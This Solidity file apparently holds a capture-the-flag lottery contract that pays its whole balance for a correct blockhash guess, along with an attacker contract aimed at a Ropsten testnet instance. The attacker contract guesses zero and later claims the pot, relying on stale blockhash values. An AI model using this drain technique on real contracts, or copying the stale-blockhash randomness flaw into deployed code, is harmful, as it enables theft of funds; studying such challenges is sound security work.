/**
HashLotto Challenge
*/

pragma solidity 0.5.10;

contract HashLotto {

    struct Ticket {
        bytes32 myGuess;
        uint atBlockNumber;
    }
    mapping (address => Ticket) public tickets;

    event LogToldYouSo(address indexed who, bytes32 braggingRights);

    constructor() public payable {
    }

    function markMyWord(bytes32 myGuess, uint32 ahead) public payable {
        require(0.1 ether <= msg.value);
        require(0 < ahead);
        tickets[msg.sender] = Ticket({
            myGuess: myGuess,
            atBlockNumber: block.number + ahead
        });
    }

    function toldYouSo(bytes32 braggingRights) public {
        Ticket storage myTicket = tickets[msg.sender];
        uint atBlockNumber = myTicket.atBlockNumber;
        require(0 < atBlockNumber);
        require(atBlockNumber < block.number);
        require(myTicket.myGuess == blockhash(atBlockNumber));
        emit LogToldYouSo(msg.sender, braggingRights);
        delete tickets[msg.sender];
        msg.sender.transfer(address(this).balance);
    }

    function() 
    external
    {
    }
}

//actual hashlotto on ropsten 0x365d1084C38E6db8c93fc9DF87C8fA7631484D3A
contract Lotto{
    HashLotto hashlotto;
    address payable lottoAddr = address(0x365d1084C38E6db8c93fc9DF87C8fA7631484D3A);
    address payable owner;
    
    constructor() 
    public 
    {
        hashlotto = HashLotto(lottoAddr);
        owner = msg.sender;
    }
    
    function () 
    external
    payable
    {
    }
    
    function wordMarker()
    payable
    public
    {
        require(msg.sender == owner);
        hashlotto.markMyWord.value(msg.value)(0,1);
    }
    
    function sayLiao()
    public

    {
        bytes32 comments = bytes32("Hello! Lubin here :)");
        hashlotto.toldYouSo(comments);
    }
    
    function withdraw()
    public
    {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}